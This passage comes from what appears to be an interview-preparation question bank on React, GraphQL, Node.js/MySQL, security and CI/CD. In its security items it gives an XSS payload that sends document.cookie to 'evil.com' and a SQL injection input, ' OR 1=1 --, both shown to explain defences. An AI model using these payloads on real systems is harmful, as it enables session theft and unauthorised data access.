    answer: 'Two parts: a controlled input and a custom useDebounce hook.\n\n  function useDebounce(value, delay) {\n    const [debounced, setDebounced] = useState(value);\n    useEffect(() => {\n      const timer = setTimeout(() => setDebounced(value), delay);\n      return () => clearTimeout(timer); // cleanup cancels previous timer\n    }, [value, delay]);\n    return debounced;\n  }\n\n  function SearchBox() {\n    const [query, setQuery] = useState(\'\');\n    const debouncedQuery = useDebounce(query, 300);\n\n    useEffect(() => {\n      if (debouncedQuery) fetchResults(debouncedQuery);\n    }, [debouncedQuery]);\n\n    return <input value={query} onChange={e => setQuery(e.target.value)} />;\n  }\n\nThe cleanup function (return () => clearTimeout) is critical — it cancels the previous timer when the user types again before 300ms elapses.',
    tip: 'The cleanup function inside useEffect is what makes debouncing work correctly in React.',
  },
  {
    id: 42,
    category: 'react',
    difficulty: 'medium',
    question: 'What is React.memo and when should you use it?',
    answer: 'React.memo is a higher-order component that prevents re-rendering if props haven\'t changed (shallow comparison).\n\n  const EmployeeList = React.memo(({ results }) => (\n    <ul>{results.map(e => <li key={e.id}>{e.firstName} {e.lastName}</li>)}</ul>\n  ));\n\n  // EmployeeList only re-renders if the results array reference changes\n\nUse it when:\n  ✓ A child component renders often due to parent re-renders\n  ✓ The component is expensive to render (long lists, complex UI)\n  ✓ Props are stable (primitive values or memoised references)\n\nDon\'t use it when:\n  ✗ Props change on almost every render anyway\n  ✗ The component is cheap to render — the memo comparison has its own cost\n\nPair with useCallback for function props: without it, a new function reference is created on every parent render, defeating React.memo.',
    tip: 'React.memo + useCallback work as a pair. One without the other often gives no benefit.',
  },
  {
    id: 43,
    category: 'react',
    difficulty: 'hard',
    question: 'What is the difference between Context and an external state manager like Zustand or Redux?',
    answer: 'Context:\n  ✓ Built into React, no extra dependency\n  ✓ Good for infrequently changing values (theme, auth user, locale)\n  ✗ Every consumer re-renders when context value changes — no selector support\n  ✗ No dev tools, no middleware, no time-travel debugging\n\nZustand / Redux:\n  ✓ Selective subscriptions — components only re-render when the specific slice they use changes\n  ✓ Dev tools, middleware (logging, persistence), action history\n  ✓ Logic (reducers/actions) is outside React — easier to test\n  ✗ Extra dependency, more boilerplate (Redux especially)\n\nFor this role: Context is fine for auth state (rarely changes). For frequently updated UI state like search results, keep it local with useState or use Zustand if it needs to be shared across many components.',
    tip: 'The critical weakness of Context is that ALL consumers re-render on any change — there\'s no way to subscribe to just part of it.',
  },

  // ── GRAPHQL ───────────────────────────────────────────────────────────────
  {
    id: 44,
    category: 'graphql',
    difficulty: 'easy',
    question: 'What is the difference between a GraphQL Query and a Mutation?',
    answer: 'Query — read-only, idempotent, cacheable. Should not change server state. Runs in parallel by default.\n  query { employees(search: "jane") { firstName lastName } }\n\nMutation — modifies server state (create, update, delete). Not cacheable. Runs sequentially.\n  mutation { updateEmployee(id: "1", firstName: "Jane") { id firstName } }\n\nKey practical difference: Apollo Client caches Query results automatically. Mutations invalidate or update the cache manually via the update() callback or refetchQueries option.\n\nFor the search feature: fetching employees = Query. Updating an employee record = Mutation.',
    tip: 'Queries are read, mutations are write. Queries run in parallel, mutations run one at a time.',
  },
  {
    id: 45,
    category: 'graphql',
    difficulty: 'easy',
    question: 'What does the ! symbol mean in a GraphQL schema?',
    answer: '! means non-null — the field is guaranteed to have a value and will never return null.\n\n  String   → can be null or a string\n  String!  → always a string, never null\n  [String] → can be null, or an array of nullable strings\n  [String!]! → always a non-null array of non-null strings\n\nFor the Employee type:\n  type Employee {\n    id:        ID!      # always present\n    firstName: String!  # always present\n    lastName:  String!  # always present\n    department: String  # optional — employee might not have one\n  }\n\nWhy it matters: non-null fields allow clients to skip null checks. Nullable fields require defensive handling.',
    tip: 'Getting ! placement right in schema design is a common interview question — [String!]! vs [String]! vs [String!] are all different.',
  },
  {
    id: 46,
    category: 'graphql',
    difficulty: 'medium',
    question: 'What is the N+1 problem in GraphQL and how does DataLoader solve it?',
    answer: 'N+1 problem: when a query returns a list of N items and each item\'s resolver makes an individual DB call.\n\n  query { employees { firstName department { name } } }\n  // → 1 query to get employees\n  // → N separate queries to get each employee\'s department\n  // = N+1 total queries\n\nDataLoader batches requests within the same tick:\n  1. All department resolver calls within one event loop tick are collected\n  2. DataLoader fires ONE query: SELECT * FROM departments WHERE id IN (1,2,3...)\n  3. Results are distributed back to each resolver\n\n  const loader = new DataLoader(ids => db.query(\n    \'SELECT * FROM departments WHERE id IN (?)\', [ids]\n  ));\n\n  // In resolver:\n  department: (employee) => loader.load(employee.departmentId)',
    tip: 'DataLoader works because it batches within a single event loop tick — a key Node.js concept.',
  },
  {
    id: 47,
    category: 'graphql',
    difficulty: 'medium',
    question: 'How does Apollo Client cache work and how do you update it after a mutation?',
    answer: 'Apollo normalises query results by typename + id into an in-memory cache.\n  { __typename: "Employee", id: "1", firstName: "Jane" }\n  is stored as Employee:1 in the cache.\n\nAfter a mutation, the cache can become stale. Two approaches:\n\n1. refetchQueries — re-run specified queries after the mutation:\n  useMutation(UPDATE_EMPLOYEE, {\n    refetchQueries: [{ query: SEARCH_EMPLOYEES, variables: { searchString } }]\n  });\n  Simple but causes an extra network request.\n\n2. update() callback — manually update the cache:\n  update(cache, { data }) {\n    cache.modify({\n      id: cache.identify(data.updateEmployee),\n      fields: { firstName: () => data.updateEmployee.firstName }\n    });\n  }\n  No extra network request but more complex.',
    tip: 'refetchQueries is simpler and correct. update() is an optimisation for when you want instant UI feedback.',
  },
  {
    id: 48,
    category: 'graphql',
    difficulty: 'hard',
    question: 'How would you handle authorisation in a GraphQL resolver?',
    answer: 'Three approaches, from simplest to most robust:\n\n1. In the resolver directly:\n  employees: (_, __, context) => {\n    if (!context.user) throw new AuthenticationError(\'Not logged in\');\n    if (!context.user.canViewEmployees) throw new ForbiddenError(\'No access\');\n    return db.getEmployees(context.user.companyId); // row-level security\n  }\n\n2. Directive-based (declarative):\n  type Query {\n    employees: [Employee!]! @auth(requires: EMPLOYEE_READ)\n  }\n\n3. Schema middleware (graphql-shield):\n  const permissions = shield({\n    Query: { employees: isAuthenticated }\n  });\n\nCritical in a multi-tenant system: always filter by companyId from the auth context. A valid JWT from Company A must never return Company B\'s employee data.',
    tip: 'Row-level security (filtering by companyId) is the most important point — authentication alone is not enough.',
  },

  // ── NODE.JS & MYSQL ───────────────────────────────────────────────────────
  {
    id: 49,
    category: 'nodejs_mysql',
    difficulty: 'easy',
    question: 'What is the Node.js event loop and why does it matter for this role?',
    answer: 'Node.js is single-threaded. Instead of blocking on I/O (DB queries, network calls), it registers callbacks and continues processing other work. The event loop picks up the callbacks when the I/O completes.\n\nOrder: sync code → nextTick → Promises → timers → I/O callbacks\n\nWhy it matters:\n  ✓ Node handles thousands of concurrent API requests efficiently because DB queries are async — the thread isn\'t blocked waiting\n  ✗ A synchronous CPU-heavy operation (large sort, complex regex on huge input) DOES block the event loop and slows ALL concurrent requests\n\nFor searchForNames: the function is synchronous and O(N×W×F). At N=50 it\'s negligible. At N=1M it would block the event loop — that\'s another reason to offload to a DB at scale.',
    tip: 'Connect the event loop directly to searchForNames — it shows you can apply concepts to the actual code.',
  },
  {
    id: 50,
    category: 'nodejs_mysql',
    difficulty: 'easy',
    question: 'What is the difference between Promise.all() and sequential await calls?',
    answer: 'Sequential await — each operation waits for the previous to complete:\n  const a = await fetchA(); // waits\n  const b = await fetchB(); // then waits\n  // Total time: timeA + timeB\n\nPromise.all() — operations run in parallel:\n  const [a, b] = await Promise.all([fetchA(), fetchB()]);\n  // Total time: max(timeA, timeB)\n\nWhen to use Promise.all: when operations are independent (fetching two unrelated resources).\nWhen to use sequential: when operation B depends on A\'s result, or when operations must not run concurrently (e.g. DB writes that could conflict).\n\nPromise.allSettled() — like Promise.all but doesn\'t reject if one fails — returns all results with a status field.',
    tip: 'Promise.all failing fast is important — if one promise rejects, the whole thing rejects. Use allSettled if you want all results regardless.',
  },
  {
    id: 51,
    category: 'nodejs_mysql',
    difficulty: 'medium',
    question: 'How do you prevent SQL injection in a Node.js MySQL query?',
    answer: 'Use parameterised queries (prepared statements). Never concatenate user input into SQL strings.\n\nBAD — vulnerable to injection:\n  db.query("SELECT * FROM employees WHERE firstName = \'" + req.query.name + "\'");\n  // Input: \' OR 1=1 -- → returns ALL employees\n\nGOOD — parameterised:\n  db.query("SELECT * FROM employees WHERE firstName = ?", [req.query.name]);\n  // The ? is a placeholder; the driver escapes the value safely\n\nWith mysql2 (Promise API):\n  const [rows] = await db.execute(\n    "SELECT * FROM employees WHERE firstName = ? AND companyId = ?",\n    [firstName, context.user.companyId]\n  );\n\nAdditionally: validate and sanitise input before it reaches the query (use zod or joi). Apply least-privilege DB user permissions — the API user should not have DROP or DELETE rights.',
    tip: 'Always mention least-privilege DB permissions alongside parameterised queries — defence in depth.',
  },
  {
    id: 52,
    category: 'nodejs_mysql',
    difficulty: 'medium',
    question: 'What is a database index and when would you add one to the employees table?',
    answer: 'An index is a data structure (usually a B-tree) that speeds up lookups on a column at the cost of slightly slower writes and additional storage.\n\nWhen to add an index:\n  ✓ Columns used in WHERE clauses frequently: firstName, lastName\n  ✓ Columns used in JOINs: companyId (joining employees to companies)\n  ✓ Columns used in ORDER BY on large tables\n\nFor this use case:\n  CREATE INDEX idx_firstName ON employees(firstName);\n  CREATE INDEX idx_lastName ON employees(lastName);\n  -- or for full-text search:\n  ALTER TABLE employees ADD FULLTEXT(firstName, lastName);\n\nWhen NOT to add an index:\n  ✗ Columns with low cardinality (e.g. a boolean isActive — only two values, index rarely helps)\n  ✗ Small tables — MySQL will do a full scan anyway\n  ✗ Columns written to very frequently — each write must update the index\n\nUse EXPLAIN SELECT ... to verify MySQL is using the index.',
    tip: 'EXPLAIN is the key tool — always verify indexes are being used, not just created.',
  },
  {
    id: 53,
    category: 'nodejs_mysql',
    difficulty: 'hard',
    question: 'How would you handle database connection pooling in a Node.js Lambda function?',
    answer: 'Problem: Lambda creates a new container per invocation. Opening a new DB connection on every invocation is slow (100–300ms) and exhausts MySQL\'s connection limit at scale.\n\nSolution: initialise the connection pool OUTSIDE the handler function so it\'s reused across invocations on the same container:\n\n  // module level — runs once per container lifecycle\n  const pool = mysql.createPool({\n    host: process.env.DB_HOST,\n    user: process.env.DB_USER,\n    password: await getSecret(\'db-password\'),\n    database: \'hr_platform\',\n    connectionLimit: 5,\n  });\n\n  // handler — reuses the pool\n  exports.handler = async (event) => {\n    const [rows] = await pool.execute(\'SELECT * FROM employees WHERE companyId = ?\', [companyId]);\n    return rows;\n  };\n\nAdditional consideration: use RDS Proxy between Lambda and RDS. It maintains a persistent connection pool to the DB and multiplexes Lambda connections through it — prevents connection exhaustion at high concurrency.',
    tip: 'RDS Proxy is the production answer for Lambda + MySQL at scale. Know it exists even if you haven\'t used it.',
  },

  // ── SECURITY ──────────────────────────────────────────────────────────────
  {
    id: 54,
    category: 'security',
    difficulty: 'easy',
    question: 'What is the difference between authentication and authorisation?',
    answer: 'Authentication — verifying who you are. "Are you who you claim to be?"\n  → Login with username/password, JWT token, OAuth\n\nAuthorisation — verifying what you\'re allowed to do. "Are you allowed to do this?"\n  → Role-based access control (RBAC), permissions, row-level security\n\nExample in a multi-tenant HR system:\n  Authentication: user logs in, receives a JWT signed by the server\n  Authorisation: that JWT contains companyId — the API only returns employees belonging to that company\n\nCommon mistake: implementing authentication but not authorisation. A valid JWT from a legitimate user of Company A should NOT be able to access Company B\'s employee data. Always filter by the authenticated user\'s companyId.',
    tip: 'The Company A / Company B example is a classic multi-tenant authorisation scenario — always bring it up.',
  },
  {
    id: 55,
    category: 'security',
    difficulty: 'easy',
    question: 'What is XSS and how does React protect against it by default?',
    answer: 'XSS (Cross-Site Scripting) — an attacker injects malicious JavaScript into a page that other users view. When executed, it can steal cookies, session tokens, or perform actions on behalf of the user.\n\nExample attack:\n  // If user input is rendered without escaping:\n  <div>{userInput}</div>\n  // Input: <script>fetch(\'evil.com/?c=\'+document.cookie)</script>\n  // → script executes in other users\' browsers\n\nHow React protects you:\n  React escapes all values embedded in JSX before rendering to the DOM.\n  <div>{userInput}</div> → React converts < to &lt;, > to &gt; — the script tag renders as text, not code.\n\nWhen you bypass React\'s protection:\n  dangerouslySetInnerHTML={{ __html: userInput }}  ← never use with user-controlled input\n  eval(), innerHTML, document.write() ← avoid entirely',
    tip: 'React\'s automatic escaping is a key safety feature — know when it can be bypassed (dangerouslySetInnerHTML).',
  },
  {
    id: 56,
    category: 'security',
    difficulty: 'medium',
    question: 'How would you store and use database credentials securely in a Lambda function?',
    answer: 'Never store credentials in:\n  ✗ Source code or git history\n  ✗ Lambda environment variables in the console (visible to anyone with Lambda read access)\n  ✗ .env files committed to the repo\n\nCorrect approach — AWS Secrets Manager:\n  1. Store the DB password in Secrets Manager\n  2. Grant the Lambda\'s IAM role secretsmanager:GetSecretValue permission\n  3. Fetch the secret at container init (outside the handler — cached for container lifetime)\n\n  let dbPassword;\n  async function getPassword() {\n    if (dbPassword) return dbPassword; // cached\n    const client = new SecretsManagerClient();\n    const { SecretString } = await client.send(\n      new GetSecretValueCommand({ SecretId: \'prod/db/password\' })\n    );\n    dbPassword = SecretString;\n    return dbPassword;\n  }\n\nBonus: Secrets Manager supports automatic password rotation — the Lambda picks up the new value on the next cold start.',
    tip: 'Caching the secret at module level (outside the handler) avoids fetching it on every invocation.',
  },
  {
    id: 57,
    category: 'security',
    difficulty: 'medium',
    question: 'What is input validation and where should it happen in a Node.js API?',
    answer: 'Input validation ensures data received from the outside world is safe and expected before it touches your business logic or database.\n\nWhere to validate: at system boundaries — the edge of your API (before the handler logic runs).\n\nWith zod in a Lambda handler:\n  import { z } from \'zod\';\n\n  const schema = z.object({\n    searchString: z.string().min(1).max(500).trim(),\n  });\n\n  exports.handler = async (event) => {\n    const body = JSON.parse(event.body);\n    const { searchString } = schema.parse(body); // throws ZodError if invalid\n    // safe to use searchString now\n  };\n\nWhat to validate for searchForNames:\n  ✓ searchString is a string (not an object or array)\n  ✓ Maximum length (prevents DoS via huge inputs)\n  ✓ arrayToSearch comes from your DB — no need to validate at query time\n\nDo NOT validate internal function calls — trust your own code. Only validate at external boundaries.',
    tip: 'Validate at boundaries, trust internals — adding validation inside pure functions is noise.',
  },
  {
    id: 58,
    category: 'security',
    difficulty: 'hard',
    question: 'What is CORS and how would you configure it correctly for a production API?',
    answer: 'CORS (Cross-Origin Resource Sharing): browsers block JavaScript from calling APIs on a different origin unless the server explicitly allows it.\n\nOrigin = protocol + domain + port. https://app.example.com and https://api.example.com are different origins.\n\nCorrect configuration — restrict to your frontend origin only:\n  // In Express:\n  app.use(cors({ origin: \'https://app.example.com\' }));\n\n  // In API Gateway (AWS): set Access-Control-Allow-Origin header\n  // In the Lambda response:\n  return {\n    statusCode: 200,\n    headers: { \'Access-Control-Allow-Origin\': \'https://app.example.com\' },\n    body: JSON.stringify(results)\n  };\n\nDo NOT use:\n  Access-Control-Allow-Origin: *  ← allows any website to call your API\n\nAlso configure:\n  Access-Control-Allow-Methods: GET, POST\n  Access-Control-Allow-Headers: Content-Type, Authorization\n  Access-Control-Allow-Credentials: true  (if sending cookies)',
    tip: 'Wildcard * origin is a common mistake — always restrict to your specific frontend domain in production.',
  },

  // ── CI/CD ─────────────────────────────────────────────────────────────────
  {
    id: 59,
    category: 'cicd',
    difficulty: 'easy',
    question: 'What is the difference between on: push and on: pull_request in GitHub Actions?',
    answer: 'on: push — fires when commits are pushed to any (or specified) branch.\non: pull_request — fires when a PR is opened, updated (new commits pushed), or reopened.\n\nBest practice:\n  on:\n    pull_request:     → run tests + lint (blocks merge if fails)\n    push:\n      branches: [main] → run tests + deploy (after merge)\n\nThis ensures:\n  1. Every PR is tested before it can be merged\n  2. main is only deployed after tests pass\n  3. You don\'t deploy half-merged feature branches\n\nBranch protection: set the CI job as a required status check in GitHub settings. GitHub blocks the merge button until the job passes — no way to accidentally merge broken code.',
    tip: 'Required status checks + branch protection rules are what make CI actually enforce quality.',
  },
  {
    id: 60,
    category: 'cicd',
    difficulty: 'easy',
    question: 'What does --frozen-lockfile do in yarn install and why is it used in CI?',
    answer: 'yarn install --frozen-lockfile tells yarn to fail with an error if the yarn.lock file would need to be updated.\n\nThis means: if package.json and yarn.lock are out of sync (e.g. someone added a package but didn\'t commit the updated lockfile), CI fails immediately with a clear error.\n\nWithout it: yarn might silently resolve and update dependencies, meaning CI could install different package versions than what runs locally — breaking the reproducibility guarantee.\n\nIn CI:\n  - run: yarn install --frozen-lockfile  ✓ reproducible\n  - run: yarn install                    ✗ may silently upgrade dependencies\n\nEquivalent for npm: npm ci (always uses package-lock.json, fails if out of sync)',
    tip: 'Reproducible builds are critical in CI — the same code should produce the same build every time.',
  },
  {
    id: 61,
    category: 'cicd',
    difficulty: 'medium',
    question: 'What is Terraform and what problem does it solve?',
    answer: 'Terraform is Infrastructure-as-Code (IaC) — it declares AWS resources in .tf files and applies changes to match reality.\n\nProblem it solves: without IaC, infrastructure is configured by hand in the AWS console. This creates "snowflake servers" — unique configurations nobody fully understands, impossible to reproduce exactly, no audit trail of changes.\n\nWith Terraform:\n  ✓ Infrastructure is version-controlled in git — changes are reviewed in PRs\n  ✓ terraform plan shows exactly what will change before it happens\n  ✓ Same config deploys identical environments (dev / staging / prod)\n  ✓ Rollback = revert the .tf file and apply\n\nKey commands:\n  terraform init    — download providers\n  terraform plan    — preview changes\n  terraform apply   — make changes\n  terraform destroy — tear down (careful!)\n\nState is stored in S3 with DynamoDB locking to prevent concurrent applies.',
    tip: 'Frame Terraform as solving the "snowflake server" problem — shows you understand why it matters, not just what it does.',
  },
  {
    id: 62,
    category: 'cicd',
    difficulty: 'medium',
    question: 'How would you securely store and use AWS credentials in GitHub Actions?',
    answer: 'Option 1 — GitHub Secrets (simpler, less secure):\n  Store AWS_ACCESS_KEY_ID and AWS_SECRET_ACCESS_KEY as GitHub Secrets.\n  Reference in workflow: ${{ secrets.AWS_ACCESS_KEY_ID }}\n  Risk: long-lived credentials that can be leaked or compromised.\n\nOption 2 — OIDC federation (preferred for production):\n  GitHub Actions assumes an AWS IAM role directly via OpenID Connect.\n  No long-lived credentials stored anywhere.\n\n  # In workflow:\n  - uses: aws-actions/configure-aws-credentials@v4\n    with:\n      role-to-assume: arn:aws:iam::123:role/GitHubActionsRole\n      aws-region: eu-west-1\n\n  # IAM role trusts GitHub\'s OIDC provider and restricts to your repo\n\nOIDC is the modern best practice — credentials are short-lived (1 hour), scoped to specific repos and branches, and there\'s nothing to rotate or accidentally expose.',
    tip: 'OIDC is the "impressive" answer here — most people know Secrets but fewer know OIDC federation.',
  },

  // ── GRAPHQL (searchForNames context) ─────────────────────────────────────
  {
    id: 64,
    category: 'graphql',
    difficulty: 'easy',
    question: 'How would you write the GraphQL schema for the searchForNames feature?',
    answer: 'Three types are needed:\n\n  input SearchInput {\n    searchString: String!\n  }\n\n  type Employee {\n    id:         ID!\n    firstName:  String!\n    lastName:   String!\n  }\n\n  type SearchResult {\n    employees:   [Employee!]!\n    totalCount:  Int!\n    searchString: String!\n  }\n\n  type Query {\n    searchEmployees(input: SearchInput!): SearchResult!\n  }\n\nKey decisions:\n  [Employee!]! — non-null array of non-null items, matching the guarantee searchForNames already provides\n  SearchResult wrapper — cleaner than returning a bare array; lets you add totalCount, pagination, or metadata later without a breaking schema change\n  input type — groups arguments; easier to extend than individual scalar arguments',
    tip: 'The SearchResult wrapper instead of a bare [Employee!]! shows schema design thinking — it\'s extensible.',
  },
  {
    id: 65,
    category: 'graphql',
    difficulty: 'easy',
    question: 'Where exactly does searchForNames get called in a GraphQL server?',
    answer: 'Inside the resolver for the searchEmployees Query field:\n\n  const resolvers = {\n    Query: {\n      searchEmployees: async (_, { input }, context) => {\n        const { companyId } = context.user;  // from auth middleware\n\n        // 1. Fetch candidates from DB\n        const candidates = await db.execute(\n          \'SELECT * FROM employees WHERE companyId = ?\', [companyId]\n        );\n\n        // 2. Run searchForNames\n        const matched = searchForNames({\n          arrayToSearch: candidates,\n          searchString:  input.searchString,\n        });\n\n        // 3. Return in schema shape\n        return { employees: matched, totalCount: matched.length, searchString: input.searchString };\n      },\n    },\n  };\n\nThe resolver handles: auth context, DB access, and calling your function. searchForNames only handles the matching logic — clean separation of concerns.',
    tip: 'The three arguments to a resolver are: parent (\_), args ({ input }), context (auth/DB). Know these.',
  },
  {
    id: 66,
    category: 'graphql',
    difficulty: 'easy',
    question: 'How would the React component call the searchEmployees query using Apollo Client?',
    answer: 'Define the query document with gql, then use useQuery:\n\n  const SEARCH_EMPLOYEES = gql`\n    query SearchEmployees($input: SearchInput!) {\n      searchEmployees(input: $input) {\n        totalCount\n        employees { id firstName lastName }\n      }\n    }\n  `;\n\n  function EmployeeSearch() {\n    const [query, setQuery] = useState(\'\');\n    const debouncedQuery = useDebounce(query, 300);\n\n    const { loading, error, data } = useQuery(SEARCH_EMPLOYEES, {\n      variables: { input: { searchString: debouncedQuery } },\n      skip: debouncedQuery.length < 2,\n    });\n\n    return (\n      <>\n        <input value={query} onChange={e => setQuery(e.target.value)} />\n        {loading && <Spinner />}\n        {data?.searchEmployees.employees.map(e => (\n          <div key={e.id}>{e.firstName} {e.lastName}</div>\n        ))}\n      </>\n    );\n  }\n\nskip prevents querying with 0–1 characters — avoids returning the entire employee list on every render.',
    tip: 'The skip option is important — without it the query fires immediately on mount with an empty string.',
  },
  {
    id: 67,
    category: 'graphql',
    difficulty: 'medium',
    question: 'Why does the resolver filter by companyId from context before calling searchForNames?',
    answer: 'This is a multi-tenant system — many client companies share the same database. Without filtering by companyId, a valid user from Company A could receive Company B\'s employee data.\n\nThe companyId comes from the authenticated user\'s JWT token, decoded by middleware and attached to the GraphQL context:\n\n  // Apollo Server context setup\n  const server = new ApolloServer({\n    typeDefs,\n    resolvers,\n    context: ({ req }) => {\n      const token = req.headers.authorization?.split(\'Bearer \')[1];\n      const user = verifyJWT(token); // throws if invalid\n      return { user, db };\n    },\n  });\n\n  // In the resolver:\n  const candidates = await db.execute(\n    \'SELECT * FROM employees WHERE companyId = ?\',\n    [context.user.companyId]  // ← enforces row-level security\n  );\n\nThis means searchForNames only ever sees employees from the authenticated company. Authentication (valid JWT) + authorisation (correct companyId filter) = secure multi-tenant search.',
    tip: 'This ties directly to the test data — the employees array in the test would be scoped to one company in production.',
  },
  {
    id: 68,
    category: 'graphql',
    difficulty: 'medium',
    question: 'How would you write a test for the searchEmployees resolver?',
    answer: 'Test the resolver as a plain async function — no need for a running GraphQL server:\n\n  // resolver.test.js\n  import { resolvers } from \'./resolvers\';\n  import { db } from \'./db\';\n\n  jest.mock(\'./db\');\n\n  test(\'returns only matched employees for the search string\', async () => {\n    db.execute.mockResolvedValue([\n      { id: \'1\', firstName: \'Jane\', lastName: \'Doe\',      companyId: \'99\' },\n      { id: \'2\', firstName: \'Joe\',  lastName: \'Bloggs\',   companyId: \'99\' },\n      { id: \'3\', firstName: \'Jane\', lastName: \'Flitwick\', companyId: \'99\' },\n    ]);\n\n    const context = { user: { companyId: \'99\' } };\n    const result = await resolvers.Query.searchEmployees(\n      {},\n      { input: { searchString: \'jane flitwick\' } },\n      context\n    );\n\n    expect(result.employees).toEqual([\n      { id: \'3\', firstName: \'Jane\', lastName: \'Flitwick\', companyId: \'99\' },\n    ]);\n    expect(result.totalCount).toBe(1);\n    expect(result.searchString).toBe(\'jane flitwick\');\n  });\n\nMock the DB layer — not searchForNames. The point is testing that the resolver correctly integrates the DB call, companyId scoping, and the search function together.',
    tip: 'Mock the DB, not searchForNames. You want to test the integration, not mock away the logic you wrote.',
  },
  {
    id: 69,
    category: 'graphql',
    difficulty: 'medium',
    question: 'What happens when the client requests a field the resolver doesn\'t return — e.g. department on Employee?',
    answer: 'GraphQL calls a field-level resolver for department. If none is defined, it tries to read employee.department directly (default resolver). If that\'s undefined, it returns null.\n\nTo properly resolve department, add a field resolver:\n\n  const resolvers = {\n    Query: { searchEmployees: ... },\n    Employee: {\n      department: async (employee) => {\n        // employee is the parent object returned by searchForNames\n        return db.execute(\n          \'SELECT * FROM departments WHERE id = ?\',\n          [employee.departmentId]\n        );\n      }\n    }\n  };\n\nN+1 concern: if searchForNames returns 10 employees, this fires 10 separate DB queries. Fix with DataLoader:\n\n  Employee: {\n    department: (employee) => departmentLoader.load(employee.departmentId)\n    // All 10 IDs are batched into one query\n  }\n\nKey insight: field resolvers only run if the client actually requests that field. If the client doesn\'t include department in the query, the resolver never fires — GraphQL is efficient by default.',
    tip: 'Field resolvers only fire when requested — this is GraphQL\'s key efficiency advantage over REST.',
  },
  {
    id: 70,
    category: 'graphql',
    difficulty: 'hard',
    question: 'How would you add pagination to the searchEmployees query without breaking existing clients?',
    answer: 'Add optional pagination arguments to the query — existing clients that don\'t pass them get the default behaviour:\n\n  # Schema change — backwards compatible because args are optional\n  type SearchResult {\n    employees:   [Employee!]!\n    totalCount:  Int!\n    hasNextPage: Boolean!\n    searchString: String!\n  }\n\n  type Query {\n    searchEmployees(\n      input:  SearchInput!\n      limit:  Int  = 20   # optional, defaults to 20\n      offset: Int  = 0    # optional, defaults to 0\n    ): SearchResult!\n  }\n\nResolver change:\n\n  searchEmployees: async (_, { input, limit = 20, offset = 0 }, context) => {\n    const candidates = await db.execute(\n      \'SELECT * FROM employees WHERE companyId = ?\', [context.user.companyId]\n    );\n    const allMatched = searchForNames({ arrayToSearch: candidates, searchString: input.searchString });\n    const page = allMatched.slice(offset, offset + limit);\n\n    return {\n      employees:   page,\n      totalCount:  allMatched.length,  // total before pagination\n      hasNextPage: offset + limit < allMatched.length,\n      searchString: input.searchString,\n    };\n  }\n\nNote: pagination happens AFTER searchForNames runs on the full candidate set. This is correct — you must match all names before slicing, or you\'d miss matches on later pages.',
    tip: 'Pagination after matching is critical — slicing the candidate list before searchForNames would give wrong results.',
  },
  {
    id: 71,
    category: 'graphql',
    difficulty: 'hard',
    question: 'How would GraphQL error handling work if searchForNames throws an unexpected error?',
    answer: 'If the resolver throws, Apollo Server catches it and adds it to the errors array in the response. The client always gets a predictable shape:\n\n  // Response on unhandled throw:\n  {\n    "data": { "searchEmployees": null },\n    "errors": [{\n      "message": "Internal server error",\n      "locations": [{ "line": 2, "column": 3 }],\n      "path": ["searchEmployees"]\n    }]\n  }\n\nBetter — distinguish user errors from system errors:\n\n  searchEmployees: async (_, { input }, context) => {\n    // User error — predictable, expected\n    if (!input.searchString.trim()) {\n      throw new UserInputError(\'Search string cannot be empty\', {\n        field: \'searchString\'\n      });\n    }\n\n    try {\n      const candidates = await db.execute(...);\n      return { employees: searchForNames({ arrayToSearch: candidates, ...input }), ... };\n    } catch (err) {\n      // System error — log it, return generic message to client\n      logger.error(\'searchEmployees resolver failed\', { err, userId: context.user.id });\n      throw new ApolloError(\'Search temporarily unavailable\');\n    }\n  };\n\nNever expose raw error messages or stack traces to the client — they reveal implementation details.',
    tip: 'Never expose raw error messages to the client. Log the real error server-side, return a generic message to the user.',
  },

  // ── DEEP DIVES (from Q&A session) ────────────────────────────────────────
  {
    id: 72,
    category: 'solution',
    difficulty: 'medium',
    question: 'The test data has two employees both named Amy Smith. How does the function return both of them?',
    answer: 'Two-phase answer:\n\n1. Claiming phase: uniqueFullNames is a Set, so "Amy Smith" appears only once. claimMatch("Amy Smith") is called once — it finds and claims the word positions. matchedFullNames = {"Amy Smith"}.\n\n2. Output phase: the final .filter() runs on the ORIGINAL arrayToSearch, which still has both Amy Smith entries. Both have getFullName() === "Amy Smith", both are in matchedFullNames → both pass the filter → both are returned.\n\nDeduplication only prevents claiming the same words twice from the search string. It has nothing to do with how many employees are returned.',
    tip: 'The claiming phase and the output phase use different arrays — that\'s the key.',
  },
  {
    id: 73,
    category: 'solution',
    difficulty: 'hard',
    question: 'If claimMatch("Amy Smith") were somehow called a second time, what would happen?',
    answer: 'It would return false.\n\nAfter the first call, the word positions for "amy" and "smith" are in usedIndexes. On a hypothetical second call:\n\n  findMatches returns [[3, 4]] — same positions as before\n  .find() checks [3, 4]:\n    index 3 → usedIndexes.has(3) = true → .every() = false\n  No unclaimed position found → .find() returns undefined\n  match is undefined → return false\n\nThis is exactly why deduplication is the right approach — without it, the second call would consume positions that were already claimed, and the real purpose (preventing one word from matching two different names) would break. The Set deduplication pre-empts this before it happens.',
    tip: 'The second call returning false is NOT a problem — the deduplication prevents it from ever happening.',
  },
  {
    id: 74,
    category: 'functions',
    difficulty: 'medium',
    question: 'How does findMatches use reduce as a sliding window? Walk through it for "Amy Smith" in "pay for amy smith today".',
    answer: 'searchWords = ["pay","for","amy","smith","today"]\nnameWords   = ["amy","smith"]\nnameLen     = 2\n\nreduce iterates i = 0, 1, 2, 3, 4:\n  i=0: "amy" === "pay"? No → skip\n  i=1: "amy" === "for"? No → skip\n  i=2: "amy" === "amy"? Yes. "smith" === searchWords[3]? Yes → match!\n    push Array.from({length:2}, (_, j) => 2+j) = [2, 3]\n  i=3: "amy" === "smith"? No → skip\n  i=4: "amy" === "today"? No → skip\n\nResult: [[2, 3]]\n\nThe _ in reduce((acc, _, i) => ...) is the current element — ignored because we only care about the position i.\nArray.from({length:2}, (_, j) => 2+j) generates [2, 3] — the indices that would be claimed.',
    tip: 'The _ in reduce is a convention for "I don\'t use this parameter". Only i (the index) matters.',
  },
  {
    id: 75,
    category: 'functions',
    difficulty: 'hard',
    question: 'Break down the .find().every() chain inside claimMatch. What does each part do and why is .every() needed?',
